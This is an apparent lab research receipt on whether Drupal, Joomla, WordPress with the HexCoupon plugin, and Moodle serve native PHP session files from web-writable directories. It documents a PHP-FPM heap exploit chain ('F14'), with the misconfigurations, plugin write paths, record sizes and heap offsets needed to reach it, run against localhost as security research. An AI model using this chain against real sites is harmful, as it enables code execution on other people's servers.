# Native PHP session-file preconditions: Drupal 11, Joomla 5, WordPress 7 + HexCoupon, Moodle 4.5

Date: 2026-10-22 (local CEST)
Receipt path: `/tmp/opencode/research/WPMATRIX_RECEIPT.md`
Status: **complete for the requested precondition matrix and the WordPress
`wp-content/uploads` test; the Moodle row is source/doc evidence only.**

## 0. Short answer

**No stock/default deployment in this matrix serves native `sess_*` files from a
web-writable directory.**

- Drupal 11 default: database sessions (`sessions` table). The file-session result is
  a lab `.user.ini` change.
- Joomla 5.4.10 installed default: database sessions (`jos_session`). The file-session
  result is a lab `configuration.php` change.
- WordPress 7.1.3 core: no production native PHP sessions. PHP's default
  `session.save_path` is empty here and falls back to `/tmp`; a distro package usually
  uses `/var/lib/php/sessions`. Neither is web-served. HexCoupon adds
  `session_start()` on `init`; that is a plugin, not WordPress core.
- Moodle 4.5 default: the **file** handler is the fallback/default for new installs,
  but its path is `$CFG->dataroot/sessions`, and the Moodle installer requires
  `dataroot` to be outside the web root. A web-served `$CFG->session_file_save_path`
  is the deployment misconfiguration.

The exact WordPress exposure tested here is the FPM pool setting

```ini
php_value[session.save_path] = /path/to/docroot/wp-content/uploads
```

combined with an active plugin that calls `session_start()` (HexCoupon) and a
separate write primitive into that same directory. `session.save_handler=files`,
`session.serialize_handler=php`, `session.use_strict_mode=0`, and
`session.upload_progress.enabled=1` are PHP defaults, not the bug. The lab-only
`session.upload_progress.cleanup=0` is disclosed below.

**Smallest sizes actually observed**

| Size | What | Enough for the F14 chain? |
|---:|---|---|
| **0 bytes** | HexCoupon `session_start()` with a fresh session; file `sess_<sid>` | No; empty session |
| **4 bytes** | `x\|N;`, lab arbitrary write; served and read | No; proves serving only |
| **16 bytes** | HexCoupon `?ref=1`: `referrer_id\|i:1;` | No; too small |
| **35,350 bytes** | Contact Form 7 Multi-Step Forms, 1000 groups x 1 value (minimum valid form submission found) | No; plant returned `PLANT_OK` |
| **360 bytes** | PHP upload-progress record, lab `cleanup=0` | No; fixed array, not the OOM plant |
| **64,946 bytes** | Nested-array OOM plant (`x\|` + 7,216 copies of `a:1:{i:0;`) | Plant yes; final no |
| **388,350 bytes** | Multi-Step Forms, 1000 groups x 20 values; real plugin write into uploads | Plant yes (OOM at HexCoupon line 85); final yes in the sibling run |
| **262,144 bytes (`0x40000`)** | Smallest F14 final actually executed (history, lab-seeded record) | **Yes, marker** |
| **524,288 bytes (`0x80000`)** | Latest plugin-written F14 final (current `uploads/sessions` run) | **Yes, marker** |
| **79,104 bytes (`0x13500`)** | Builder-valid lower bound for the prior measured geometry | **Not executed** |

The shortest accurate sentence is: **the smallest file is 0 bytes, the smallest
non-empty HexCoupon record is 16 bytes, the plugin-written record that reached the OOM
plant in this test was 388,350 bytes (we did not bisect the 35,350..388,350 range), and
the smallest recorded F14 final actually executed was 262,144 bytes.** The 4-byte
record is the smallest non-empty valid session file tested, but it was written by the
lab and is not an F14 record.

## 1. Precondition matrix

| App | Stock/default session storage | Default serves native `sess_*` from a web-writable dir? | File-session setting that changes the answer | What the attacker must write |
|---|---|---|---|---|
| **Drupal 11.4.11** | Database: `Drupal\Core\Session\SessionHandler` uses `Drupal\Core\Database\Connection`; a real login wrote a 175-byte row to `sessions`, no `sess_*` file | **No** | Lab `www/exploit/.user.ini`: `session.save_handler=files`, `session.save_path=.../sites/default/files/php/sessions`, with nginx serving that directory | A `sess_<sid>` file in the served session directory. The Drupal lab's F14 leak used 81,920 bytes; final marker `MARKER_PASSTHRU` reproduced 3/3 on fresh masters |
| **Joomla 5.4.10** | Database: installed `session_handler='database'`; front-page request wrote 716 bytes to `jos_session`, no `sess_*` in `tmp/` | **No** | Lab `configuration.php`: `session_handler='filesystem'`, `session_filesystem_path='/tmp/opencode/joomla5/tmp'`; nginx serves `tmp/` | A `sess_<sid>` file in the served directory. Joomla's own file handler wrote a 716-byte `sess_a789...`; F14 final used 98,304 bytes (`0x18000`) |
| **WordPress 7.1.3 + HexCoupon** | Core: no production native sessions. PHP default: `session.save_handler=files`, `session.save_path` empty -> `/tmp` here (distro: `/var/lib/php/sessions`). HexCoupon is not core | **No** by default | FPM pool `php_value[session.save_path]=<docroot>/wp-content/uploads`; HexCoupon `init` -> `session_start()`; nginx serves uploads | A `sess_<sid>` file in uploads. HexCoupon alone creates 0 or 16 bytes; a separate plugin/write primitive is needed for 64,946/388,350/262,144/524,288 |
| **Moodle 4.5 (source/doc only)** | File handler is the fallback/default for new installs: `\core\session\file` in `$CFG->dataroot/sessions`, outside the web root; installer says dataroot "must not be web accessible" | **No** by default; native files are created, but outside the served tree | Set `$CFG->session_file_save_path` to a directory under the docroot, or serve `dataroot` by mistake. The handler calls `ini_set('session.save_handler','files')` and writes `sess_<sid>` | A `sess_<sid>` file in the served directory (Moodle itself writes one on session start; arbitrary content needs a write primitive) |

### 1.1 The one-line distinction

- **Application defaults:** Drupal DB, Joomla DB, WordPress no native sessions, Moodle
  files but outside the web root.
- **Lab/deployment misconfigurations:** Drupal `.user.ini`, Joomla `configuration.php`,
  WordPress FPM `session.save_path`, Moodle `session_file_save_path` under the docroot.
- **The file format is not the vulnerability:** the native file handlers in this
  matrix use `sess_<sid>`; exposure requires the path to be both writable by PHP and
  readable by the web server.

## 2. Drupal 11.4.11

### 2.1 Default: database sessions

The installed default is the database handler. A real login produced:

```
sid=FNSznSMsphK_Gf1rr3scy31rGgAqxobDDoIGnnG7d4g
uid=1
session length=175
row in drupal.sessions
no sess_<sid> file in the session directory
```

`www/core/core.services.yml` defines `session_handler.storage` as
`Drupal\Core\Session\SessionHandler`; that class takes a `Connection` and reads/writes
the `sessions` table. This is the stock behavior.

### 2.2 Lab file-session change

`www/exploit/.user.ini`:

```ini
session.save_handler = files
session.save_path = /tmp/opencode/drupaldx/sites/default/files/php/sessions
session.serialize_handler = php
session.use_strict_mode = 0
session.use_only_cookies = 1
session.upload_progress.enabled = 1
session.upload_progress.cleanup = 0
session.upload_progress.prefix = ""
session.upload_progress.name = PHP_SESSION_UPLOAD_PROGRESS
session.upload_progress.freq = 1
session.upload_progress.min_freq = 0
session.gc_probability = 0
memory_limit = 2M
unserialize_max_depth = 20000
```

The directory is served by nginx at
`/sites/default/files/php/sessions/`. The F14 leak/final chain was reproduced 3/3 with
fresh FPM masters `167756`, `171921`, `172056`; final workers `171102`, `171977`,
`172088`; markers `MARKER_PASSTHRU_r0/r1/r2`; workers survived. Stable deltas:
`B0-K=+0xB000`, `P-K=-0x3000`, `X-K=-0x15000`, `S_dest-K=-0x16FC0`, `S-K=+0x18`.

Full evidence: `/tmp/opencode/research/drupal_fpm_20261022T013000Z/FINAL_RECEIPT.md`.

## 3. Joomla 5.4.10

### 3.1 Default: database sessions

The preserved installed configuration is `configuration.php.default_database`:

```php
public $session_handler = 'database';
public $session_metadata = true;
```

A front-page request wrote a 716-byte `jos_session` row and created no `sess_*` file
in `tmp/`. The package ships only `tmp/index.html`, not a `tmp/.htaccess`.

### 3.2 Lab file-session change

`configuration.php` was changed to:

```php
public $session_handler = 'filesystem';
public $session_filesystem_path = '/tmp/opencode/joomla5/tmp';
```

Joomla wrote `tmp/sess_a789df811b23763cf8e3265add0db4e8` (716 bytes), and nginx served
it with HTTP 200, SHA-1 `7195681a86bfec51ca7145c8653897cca74fea2b`.

A lab-created `tmp/.htaccess` (`Require all denied`, `Deny from all`) was also served
HTTP 200 because nginx ignores `.htaccess`. Do not attribute that deny file to the
Joomla package.

The F14 lab run used `0x18000` (98,304 bytes), `used=-0x1805`, `B0-K=+0xC000`; final
worker `178847` created `MARKER_PASSTHRU_j2`, served the trigger and health requests
HTTP 200, and survived. Full evidence:
`/tmp/opencode/research/joomla_fpm_20261022T021000Z/JOOMLA_RECEIPT.md`.

## 4. WordPress 7.1.3 + HexCoupon: the uploads-root test

### 4.1 Stack and exact pool setting

Stack: `/tmp/opencode/research/wpmatrix_20261022T022252Z`
HTTP: `127.0.0.1:28894`
FPM binary: `/tmp/opencode/realapps/install_realapps_np/sbin/php-fpm`, PHP 8.5.10,
md5 `4ee099823b75e16ea36f93c71d57bfd8`
FPM master: `192487`; nginx master: `192484`
ASLR: `/proc/sys/kernel/randomize_va_space = 2`

The critical pool lines:

```ini
php_value[session.save_handler] = files
php_value[session.save_path] = /tmp/opencode/research/wpmatrix_20261022T022252Z/www/wp-content/uploads
php_value[session.serialize_handler] = php
php_value[session.use_strict_mode] = 0
php_value[session.upload_progress.enabled] = 1
php_value[session.upload_progress.cleanup] = 0
php_value[session.upload_progress.freq] = 1
php_value[session.upload_progress.min_freq] = 0
```

`session.save_handler=files`, `session.serialize_handler=php`,
`session.use_strict_mode=0`, and `session.upload_progress.enabled=1` are PHP defaults.
**The deployment misconfiguration is the `session.save_path` pointing at the
web-served, FPM-writable uploads directory.** `session.upload_progress.cleanup=0` is a
lab tweak: the stock default is `1`. The one-worker pool (`pm.max_children=1`) is also
lab determinism, not a stock WordPress requirement.

With `session.use_strict_mode=0` (the default here), PHP accepts the attacker's
`PHPSESSID` and uses `sess_<sid>` directly. With strict mode enabled and no existing
file, PHP would reject the unknown SID and issue a new one; that would defeat the
attacker's choice of filename unless a file already exists.

The nginx root is the WordPress tree and serves
`/wp-content/uploads/sess_*` as static files (`Content-Type:
application/octet-stream`). There is no uploads `.htaccess` in this nginx lab; nginx
ignores `.htaccess` anyway. Apache behavior is discussed in the caveats.

### 4.2 WordPress/PHP default is not this

- WordPress core `7.1.3` has **no production `session_start()` call**. The only
  matches in core are site-health diagnostic strings in
  `wp-admin/includes/class-wp-site-health.php` (four references, no session start).
- The same PHP binary with no `session.save_path` override reports:

```
session.save_handler=files
session.save_path=
session.serialize_handler=php
session.use_strict_mode=0
session.upload_progress.enabled=1
session.upload_progress.cleanup=1
sys_temp=/tmp
```

A CLI session with the default path wrote `/tmp/sess_clidefault...` (6 bytes), not a
docroot file. A distro PHP package normally uses `/var/lib/php/sessions`; neither
location is web-served.

Therefore the positive WordPress result is **not** a WordPress default. It requires
(a) the FPM pool `session.save_path` change and (b) an active plugin that starts a
native session. HexCoupon supplies (b); a separate write primitive supplies the
attacker-controlled bytes.

### 4.3 HexCoupon code and its limits

`/tmp/opencode/wpplug/hex/hex-coupon-for-woocommerce/app/Core/Helpers/LoyaltyProgram/LoyaltyProgramHelpers.php`:

```php
// line 46
add_action( 'init', [ $this, 'start_session' ] );

// lines 82-86
public function start_session()
{
    if ( ! session_id() ) {
        session_start();
    }
}

// lines 186-190
public function handle_referral()
{
    if ( isset( $_GET['ref'] ) ) {
        $_SESSION['referrer_id'] = intval( $_GET['ref'] );
        wp_redirect( home_url( '/my-account' ) );
        exit;
    }
}
```

The plugin's `app/` code has **no** `move_uploaded_file`, `wp_handle_upload`,
`wp_upload_bits`, `file_put_contents`, `fwrite`, or `fopen` call. Its vendor directory
only has Composer `fwrite(STDERR, ...)` diagnostics. HexCoupon can create an empty
session file, write the 16-byte `referrer_id|i:1;`, and (in `StoreBlock.php`, nonce
protected) write `deducted_store_credit_amount`; it has **no raw file-write primitive**
that can put an arbitrary session record into uploads.

The write requirement therefore splits in two:

1. **Application-created file:** HexCoupon's `session_start()` creates a 0-byte
   `sess_<sid>`; `?ref=1` adds 16 bytes. This is enough to prove the path is writable
   and served, but not enough for the F14 plant/final.
2. **Attacker-controlled record:** the attacker needs a separate write/upload primitive
   into the same `session.save_path` (or a plugin that serializes attacker input into
   the native session). The 4-byte `x|N;` test is the lower bound for a servable file;
   the 35,350/388,350-byte Multi-Step Forms records are real plugin examples; the F14
   plant/final records are much larger and heap-specific.

### 4.4 What actually created the non-trivial records

A second real plugin, **Contact Form 7 Multi-Step Forms 4.7.1** (with Contact Form 7
6.2.3), was used. The free plugin's native-PHP-session fallback was forced by a lab
mu-plugin:

```php
<?php
/* Lab configuration: use the free plugin's documented native PHP session fallback. */
add_filter( 'cf7msm_force_session', '__return_true' );
```

This is a **lab configuration**, not stock WordPress. The form is ID 26 at
`/plugin-step1/`, unauthenticated. The submission is a normal form POST with 1000
checkbox groups (`f000`..`f999`) and values. It writes `cf7msm_posted_data` into the
native PHP session. A 1-group submission was invalid and produced only a 0-byte
session; 1000 groups x 1 value was the smallest valid submission found (35,350 bytes).

### 4.5 Size ladder (all observed on the uploads-root stack unless noted)

| Size | Creation | File / evidence | HTTP served | Plant at 2M | Notes |
|---:|---|---|---:|---|---|
| **0** | `GET /` with `PHPSESSID=wpzero...`; HexCoupon `session_start` | `sess_wpzero1792628611` | **200, 0 bytes** | n/a | Smallest file; empty session |
| **4** | Lab writes `x\|N;` | `sess_wp41792629334` | **200, 4 bytes** | n/a | Smallest non-empty valid session file tested; plugin read it, file stayed 4 |
| **16** | `GET /?ref=1` with `PHPSESSID=wpref...`; HexCoupon | `sess_wpref1792628744`, `referrer_id\|i:1;` | **200, 16 bytes** | n/a | Smallest non-empty record HexCoupon itself writes |
| **35,350** | Multi-Step Forms, 1000 groups x 1 value; body 19,270; 302 | `sess_plug1k1792629154`; SHA-1 `e30ef67269cd16867e561298f0cd4d98b049d227` | **200, 35,350 bytes** | **`PLANT_OK`** (no OOM) | Smallest valid plugin-written form record found; native-session fallback forced by lab filter |
| **360** | PHP upload progress `probe42`, multipart POST | `sess_upprog1792628725`; starts `upload_progress_probe42\|a:5:{...}` | **200, 360 bytes** | n/a | Lab `cleanup=0`; stock default `1` |
| **64,946** | Lab nested-array plant `x\|` + 7,216 x `a:1:{i:0;` | `sess_p2` (deleted by OOM) | n/a | **OOM at line 85; worker survived** | Measured `P=0x7fe35e097000`, `B0=0x7fe35e09a000` on worker 264058 |
| **388,350** | Multi-Step Forms, 1000 groups x 20 values; body 380,270; 302 | `sess_plugJ2x...`; `sess_size 388350` in `arms/plugJ2.evidence` | File deleted by OOM before fetch | **OOM at line 85; worker 575730 survived** | Real unauthenticated plugin write into uploads root; lab filter |
| **262,144** | F14 final, history; lab-seeded record | `history/README_20261022T0202Z.md` (record not separately preserved) | n/a | n/a | **`MARK_REAL`; worker 169841 survived** |
| **524,288** | F14 final, current plugin-written chain | `cycles/finalJ.rec`; `finalJ.geo` | n/a | n/a | **`MARK_REAL`; worker 572531 survived** |
| **79,104** | Builder lower bound, prior geometry | no file executed | n/a | n/a | `0x13500`; **not executed** |

The 35,350-byte record is important because it is a **real unauthenticated plugin
write**, not a lab-seeded file; it is not enough to OOM at 2M. The 388,350-byte record
is the full plugin write and **does** OOM at `LoyaltyProgramHelpers.php:85`, with the
worker surviving.

### 4.6 Exact uploads-root write + OOM evidence

`arms/plug1k.evidence`:

```
status 302 req 19270 resp 0 ... sess_size 35350
```

`arms/p35k_plant.body`:

```
PLANT_OK
```

`arms/plugJ2.evidence`:

```
status 302 req 380270 resp 0 ... sess_size 388350
```

`arms/plugJ2_plant.headers`: HTTP **500**, empty body.
`log/php-error.log`:

```
PHP Fatal error: Allowed memory size of 2097152 bytes exhausted (tried to allocate
20480 bytes) in .../LoyaltyProgramHelpers.php on line 85
#0 ... start_session()
#1 .../wp-content/uploads/plant/hexplant.php(8): ...->start_session()
```

The 388,350-byte file was present before the plant and gone after it; the plant
endpoint intentionally lowers `memory_limit` to 2M in `uploads/plant/.user.ini`, so
the record is consumed/deleted on OOM. Worker **575730** survived; it was later killed
only to reset for the 4-byte test, and master 192487 respawned worker **579387**.
Static fetches are safe; do not use a session-starting endpoint as a health check on a
post-plant worker.

## 5. F14 final evidence

### 5.1 Smallest executed final: `0x40000` (262,144 bytes), history

The history receipt at
`/tmp/opencode/research/realchain_20261022T015900Z/history/README_20261022T0202Z.md`
records:

```
P        = 0x7f3d44097000
K_dest   = 0x7f3d440ab000
X        = 0x7f3d4406a000
second B = 0x7f3d440b2000
F        = 0x7f3d440b2218
total    = 0x40000 (262144)
marker   = MARK_REAL
worker   = 169841 (survived)
```

The final request was gdb-free; the session file was consumed to 0 bytes; the marker
was created. This is the **smallest F14 final actually executed on WordPress**. It used
a lab-seeded 262,144-byte record, not a plugin-written one.

### 5.2 Latest plugin-written final: `0x80000` (524,288 bytes)

The current README at
`/tmp/opencode/research/realchain_20261022T015900Z/README.md` records a fresh
unauthenticated Multi-Step Forms write of **388,350 bytes**, a plant at HexCoupon line
85 (`P=0x7f216dae6000`), and a final:

```
K_dest   = 0x7f216daeb000
X        = 0x7f216da6a000
F        = 0x7f216daf2218
second B = 0x7f216daf2000
total    = 0x80000 (524288)
marker   = MARK_REAL, 2026-10-22 02:29:59 +0200
worker   = 572531 (alive after the final)
static   = 0x22c54c8 <ps_serializers+40>: 0xa3c074
```

This run proves the **plugin-write path** is sufficient for the full chain. It is
larger than the history final; do not describe it as a smaller record. The run also
used a **1,048,576-byte (`0x100000`) leak trigger** because the measured `P-X` was
`0x7c000`; that leak size is separate from the 524,288-byte final record.

### 5.3 No smaller executed claim

For the prior measured WordPress geometry (`P=0x7f3d44097000`,
`K=0x7f3d440ab000`), the record builder fails at `0x13400` and first passes at
`0x13500`:

```
0x13400 -> AssertionError: ('0x3e8', -37, 77809, 1037)
0x13500 -> {'total': 79104, ...}
```

So **79,104 bytes (`0x13500`) is a builder-valid lower bound**, but **no 79,104-byte
final was executed**. The smallest executed final remains **262,144 bytes
(`0x40000`)**. The current plugin-written final is **524,288 bytes (`0x80000`)**.
Any claim of a smaller final would be untested.

## 6. Moodle 4.5: source/doc row

Moodle was **not installed** for this receipt; this row is source/doc evidence, clearly
separated from the installed Drupal/Joomla/WordPress tests.

Source: Moodle `MOODLE_405_STABLE`, version `4.5.15+ (Build: 20261021)`.

`lib/classes/session/file.php`:

```php
public function __construct() {
    global $CFG;
    if (!empty($CFG->session_file_save_path)) {
        $this->sessiondir = $CFG->session_file_save_path;
    } else {
        $this->sessiondir = "$CFG->dataroot/sessions";
    }
}

public function init() {
    ...
    ini_set('session.save_handler', 'files');
    ini_set('session.save_path', $this->sessiondir);
}

public function session_exists($sid) {
    $sid = clean_param($sid, PARAM_FILE);
    ...
    $sessionfile = "$this->sessiondir/sess_$sid";
    return file_exists($sessionfile);
}
```

`lib/classes/session/manager.php` `get_handler_class()`:

```php
if (!empty($CFG->session_handler_class)) {
    return $CFG->session_handler_class;
} else if (!empty($CFG->dbsessions) && $DB->session_lock_supported()) {
    return database::class;
}
return file::class;
```

Thus the file handler is the fallback/default for new installs, and the default path is
`$CFG->dataroot/sessions`. The Moodle CLI installer says:

```
--dataroot=DIR   Location of the moodle data folder, must not be web accessible.
                 Default is moodledata in the parent directory.
```

(`admin/cli/install.php`, lines 59-61.) Moodle docs likewise state the file driver is
used by default in new installations; the direct docs page was Cloudflare-challenged in
this environment, but the source fallback and installer text are decisive.

**Moodle default result:** native `sess_*` files are created, but outside the web root;
not served. **Moodle misconfiguration:** set `$CFG->session_file_save_path` to a
web-served directory (or serve `dataroot` itself). Then the same `sess_<sid>` exposure
applies. The attacker must write a `sess_<sid>` file there, or cause Moodle to write
one and read it; arbitrary content still needs a write primitive.

## 7. Caveats and scope

1. **Private lab only.** All requests were to `127.0.0.1`; no public target was used.
   Shared PIDs `4052217`, `4052937`, `4053032`, `4054145` were not targeted; none were
   present in the process table at the final check. Only private FPM workers under the
   lab masters were used/killed/respawned.
2. **Defaults vs misconfigurations.** Drupal DB, Joomla DB, WordPress no native
   sessions, and Moodle files outside the web root are the defaults. Every positive
   file-served result required a configuration change. The file-session result is not
   evidence that the stock app exposes session files.
3. **HexCoupon alone is insufficient for F14.** Its unauthenticated `init`/`?ref=`
   paths create 0 or 16 bytes. `StoreBlock.php` can write an attacker-supplied
   `deducted_store_credit_amount` value, but it is nonce-protected and still serializes
   a PHP value rather than writing raw file bytes. The 388,350-byte write came from a
   second plugin (Contact Form 7 Multi-Step Forms) with a lab `cf7msm_force_session`
   filter. The filter and the one-worker pool are lab choices. A real deployment would
   need any write/upload primitive into the same save_path.
4. **`session.upload_progress.cleanup=0` is lab-only.** Stock PHP default is `1`; the
   360-byte upload-progress record persists only because the lab sets `0`. The 0/16-
   byte HexCoupon files and the plugin-written files do not depend on that setting.
5. **The F14 final was not rerun on the uploads-root stack.** The uploads-root stack
   reached the 388,350-byte write + OOM plant. The final marker evidence is on the
   sibling `uploads/sessions` stack (current `0x80000`) and the history `0x40000` run.
   Heap geometry is path/master-specific; the root geometry was not transplanted.
6. **The exact F14 startup OOM kills FPM.** The working plant is a script-level OOM at
   HexCoupon line 85, followed by a pre-RINIT upload-progress trigger. The worker
   survives the plant; the leak trigger may kill the worker as expected. The final
   worker survives in the successful runs.
7. **One FPM worker.** `pm.max_children=1` makes the plant/trigger hit the same worker
   deterministically. A production pool with multiple workers turns the stale-state
   step into a race; this receipt does not claim multi-worker reliability.
8. **Permissions.** The lab's `sess_*` files are `0600` owned by `davide`; nginx and
   FPM both run as `davide`, so nginx can read them. A deployment with separate
   nginx/Apache and FPM users may return 403 even with the path served. The exposure
   requires read permission as well as the path.
9. **`.htaccess` is not a universal control.** The lab uses nginx, which ignores
   `.htaccess`; Joomla's lab-created deny file was served HTTP 200. Apache with a
   default WordPress uploads `.htaccess` may block PHP execution, but extensionless
   `sess_*` files are not PHP and may still be served unless the rule denies all
   files. Do not treat a PHP-execution deny as a session-file deny.
10. **Moodle is source-only.** No Moodle install, HTTP request, or session file was
    created. Its row is clearly marked as source/doc evidence.
11. **The 4-byte record is not an exploit record.** `x|N;` proves arbitrary writes are
    served and parsed; it does not contain the fake `php_unserialize_data`, dtor, or
    execute data needed for F14.
12. **The 35,350-byte record did not OOM; 388,350 did.** `PLANT_OK` means the 2M plant
    endpoint parsed the 35,350-byte record successfully. The 388,350-byte record
    OOMed. We did not bisect the range between those two plugin-written sizes, so
    388,350 is not claimed as the minimal plugin-written OOM record. The 64,946-byte
    nested-array record is a smaller OOM plant but is lab-seeded, not plugin-written.
13. **Cross-stack redirect artifact.** The new stack shares the `wpreal` database with
    the older realchain stack, so the CF7 form's `next_url`/redirect can point at port
    28893. The session file was written by the 28894 request into the 28894 uploads
    root; the redirect target is a lab artifact, not a write failure.
14. **Invalid session IDs are rejected.** An early 388,350 attempt used a SID with
    `_`; PHP warned "Session ID is too long or contains illegal characters" and wrote
    no file. The successful retry used an alphanumeric SID (`plugJ2x...`). Real PHP
    SID charset is `[A-Za-z0-9,-]` unless configured otherwise.

## 8. Receipts and evidence paths

### 8.1 Primary receipt and stack

- This report: `/tmp/opencode/research/WPMATRIX_RECEIPT.md`
- Current pointer: `/tmp/opencode/research/WPMATRIX_CURRENT`
- Exact FPM pool: `/tmp/opencode/research/wpmatrix_20261022T022252Z/conf/fpm.conf`
- nginx: `/tmp/opencode/research/wpmatrix_20261022T022252Z/conf/nginx.conf`
- Uploads root: `/tmp/opencode/research/wpmatrix_20261022T022252Z/www/wp-content/uploads`

### 8.2 WordPress size/evidence files

- `arms/zero_sid.txt`, `arms/zero_fetch.headers` (0 bytes, HTTP 200)
- `arms/four_sid.txt`, `arms/four_fetch.headers`, `arms/four_fetch.bin` (4 bytes)
- `arms/ref_sid.txt`, `arms/ref.headers` (16 bytes, 302)
- `arms/up_sid.txt`, `arms/up.headers`, `sess_upprog1792628725` (360 bytes)
- `arms/plug1k.evidence`, `arms/plug1k_submit.html`, `sess_plug1k1792629154`
  (35,350 bytes, SHA-1 `e30ef67269cd16867e561298f0cd4d98b049d227`)
- `arms/p35k_plant.body` (`PLANT_OK`)
- `arms/plugJ2.evidence`, `arms/plugJ2_plant.headers`, `arms/plugJ2_plant.body`
  (388,350 bytes; HTTP 500 OOM)
- `log/php-error.log` (HexCoupon line 85 OOM)
- `arms/measure_decode.log` (benign `0x40000` decode pointers:
  `X=0x7fe35e06b000`, `B=0x7fe35e0ac000`)
- `arms/gdb_plant2.out` (64,946 plant:
  `P=0x7fe35e097000`, `B0=0x7fe35e09a000`)

### 8.3 F14 final

- `/tmp/opencode/research/realchain_20261022T015900Z/README.md` (current
  `0x80000` plugin-written final, worker 572531, `MARK_REAL`)
- `/tmp/opencode/research/realchain_20261022T015900Z/history/README_20261022T0202Z.md`
  (history `0x40000` final, worker 169841, `MARK_REAL`)
- `cycles/finalJ.rec` (524,288 bytes), `cycles/finalJ.geo`, `cycles/finalJ.resp`
- `MARK_REAL` (size 0, mtime 2026-10-22 02:29:59 +0200)
- static poison: `0x22c54c8 <ps_serializers+40>: 0x0000000000a3c074`

### 8.4 Drupal/Joomla

- `/tmp/opencode/research/drupal_fpm_20261022T013000Z/FINAL_RECEIPT.md`
- `/tmp/opencode/research/joomla_fpm_20261022T021000Z/JOOMLA_RECEIPT.md`

### 8.5 Moodle source

- `/tmp/opencode/moodle_src/file.php`
- `/tmp/opencode/moodle_src/manager.php`
- `/tmp/opencode/moodle_src/install_cli.php`
- Raw sources: `https://raw.githubusercontent.com/moodle/moodle/MOODLE_405_STABLE/lib/classes/session/file.php`,
  `.../lib/classes/session/manager.php`, `.../admin/cli/install.php`

## 9. Current process/safety snapshot

At the final check:

- New WordPress stack: nginx master **192484**, FPM master **192487**, current clean
  worker **579387** (after the 4-byte test). Worker **575730** had survived the
  388,350-byte plant and was killed only to reset for the 4-byte test.
- Older realchain stack: FPM master **184500**, worker **572531** alive; final marker and
  static serializer poison present. Do not use a session-starting endpoint on it.
- Drupal: master **172056**, final worker **172088**.
- Joomla: master **174553**, final worker **178847**.
- Shared PIDs `4052217`, `4052937`, `4053032`, `4054145`: not present in the final
  `ps` output and not targeted by any command in this work.

**Bottom line:** The stock applications do not put native PHP session files in a
web-served writable directory. The WordPress `uploads` exposure is a deployment
misconfiguration (`session.save_path`) plus a plugin that starts a native session; the
smallest file is empty (0 bytes), the smallest non-empty HexCoupon record is 16 bytes,
the plugin-written record that reached the OOM plant in this test was 388,350 bytes
(not bisected), and the smallest recorded F14 final actually executed is 262,144 bytes
(`0x40000`). The 79,104-byte builder lower bound is not an executed result.
